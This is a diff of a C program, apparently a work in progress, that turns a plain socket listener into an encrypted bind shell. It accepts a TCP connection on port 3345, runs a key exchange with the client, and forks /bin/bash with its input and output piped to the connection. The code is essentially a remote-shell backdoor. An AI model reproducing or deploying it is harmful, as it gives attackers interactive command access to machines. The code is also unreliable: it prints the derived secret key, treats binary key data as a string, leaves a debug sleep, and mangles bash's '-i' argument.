@@ -3,13 +3,12 @@
 #include <unistd.h>
 #include<string.h>
 #include <sys/types.h>
-#include<openssl/dh.h>
 
 #include <fcntl.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
-
+#include "crypto.c"
 #define NUM_PIPES          2
 
 #define PARENT_WRITE_PIPE  0
@@ -27,23 +26,27 @@ int pipes[NUM_PIPES][2];
 #define PARENT_WRITE_FD ( pipes[PARENT_WRITE_PIPE][WRITE_FD] )
 #define CHILD_READ_FD   ( pipes[PARENT_WRITE_PIPE][READ_FD]  )
 
+#define ERROR_PIPE ( errfd[1] )
+
 
 void error(char *msg)
 {
     perror(msg);
     exit(1);
 }
+void hex (unsigned char *p, size_t n){ while(n--) printf("%02x", *p++); }
 int main() {
 
   // Network stuff
-  int sockfd, newsockfd, portno, clilen, n;
+  int sockfd, newsockfd, portno, n;
 
-  char sock_buffer[256];
+  socklen_t clilen;
+  char sock_buffer[1024];
 
   struct sockaddr_in serv_addr, cli_addr;
   sockfd = socket(AF_INET, SOCK_STREAM, 0);
   bzero((char *) &serv_addr, sizeof(serv_addr));
-  portno = 3330;
+  portno = 3345;
 
   serv_addr.sin_family = AF_INET;
   serv_addr.sin_port = htons(portno);
@@ -59,23 +62,53 @@ int main() {
   newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
   clilen = sizeof(cli_addr);
 
-  bzero(sock_buffer,256);
+  bzero(sock_buffer,1024);
 
+  // Setting up pipes for bash <-> socket
+  // communication.
   pipe(pipes[PARENT_READ_PIPE]);
   pipe(pipes[PARENT_WRITE_PIPE]);
 
   int errfd[2];
   pipe(errfd);
 
+  // Begin doing crypto handshake with client
+  unsigned char iv[16];
+  EVP_PKEY * full_key = generate_key();
+  unsigned char server_public_key [100];
+  unsigned char client_public_key[100];
+  unsigned char *public_key_ptr = &server_public_key[0];
+  size_t server_pub_len = i2d_PUBKEY (full_key, &public_key_ptr);
 
+  n = recv(newsockfd,sock_buffer,75, 0);
+  memcpy(iv, sock_buffer, 16);
+  memcpy(client_public_key, &sock_buffer[16], 59);
+
+  char writebuffer[1000];
+  bzero(writebuffer, 1000);
+  memcpy(writebuffer, server_public_key, 59);
+  n =  write(newsockfd, writebuffer, strlen((const char *)server_public_key));
+  if (n < 0) {
+      printf("failed to write :(");
+  }
+
+  size_t keylen;
+  unsigned char * secret_key = derive (full_key, client_public_key, 59, &keylen);
+
+  printf("keylen: %lu\n", keylen);
+  printf("PRINTING SECRET KEY %s\n", secret_key);
+  printf("keylen: %lu\n", keylen);
+  hex(secret_key, keylen);
+
+  sleep(100);
   pid_t procId = fork();
 
   if (procId == 0 ) {
-    char *argv[]={ "/bin/bash", "-i", 0};
+    char *argv[]={ "/bin/bash", " i", 0};
 
     dup2(CHILD_READ_FD, STDIN_FILENO);
     dup2(CHILD_WRITE_FD, STDOUT_FILENO);
-    dup2(errfd[1], STDERR_FILENO);
+    dup2(ERROR_PIPE, STDERR_FILENO);
 
     execv(argv[0], argv);
   } else if (procId > 0) {
